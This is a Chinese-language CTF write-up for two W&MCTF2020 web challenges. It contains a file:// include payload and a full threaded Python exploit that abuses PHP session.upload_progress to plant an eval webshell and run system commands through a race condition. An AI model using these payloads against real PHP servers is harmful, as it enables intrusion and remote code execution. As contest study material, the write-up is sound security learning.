---
title: W&MCTF2020
date: 2020-08-03
image: https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210228100849.jpeg
description: W&M战队主板，0day大战
categories: 
- ctf_writeup
tags:
- session.upload_progress
- 文件包含
---
0day大战，，，打不动，告辞

------

### web_checkin

考点：文件包含file协议

```
<?php
//PHP 7.0.33 Apache/2.4.25
error_reporting(0);
$sandbox = '/var/www/html/' . md5($_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);
highlight_file(__FILE__);
if(isset($_GET['content'])) {
    $content = $_GET['content'];
    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))
         die('hacker');
    if(file_exists($content))
        require_once($content);
    file_put_contents($content,'<?php exit();'.$content);
}
```

直接file读取根目录flag

```
?content=file:///flag
```

WMCTF{a1sc8591as98c1a96s85c165as1cas7d89}

 

 

 

### Make PHP Great Again

考点：session.upload_progress文件包含，条件竞争

referer:https://www.freebuf.com/news/202819.html

exp:

```
#coding=utf-8
 
import io
import requests
import threading
sessid = 'TGAO'
data = {"cmd":"system('tac /var/www/html/flag.php');"}
def write(session):
    while True:
        f = io.BytesIO(b'a' *100* 50)
        resp = session.post( 'http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )
def read(session):
    while True:
        resp = session.post('http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com?file=/tmp/sess_'+sessid,data=data)
        if 'tgao.txt' in resp.text:
            print(resp.text)
            event.clear()
        else:
            print("[+++++++++++++]retry")
if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        for i in range(1,30):
            threading.Thread(target=write,args=(session,)).start()
 
        for i in range(1,30):
            threading.Thread(target=read,args=(session,)).start()
    event.set()
```

WMCTF{php_s0urc3_1s_om0sh1201}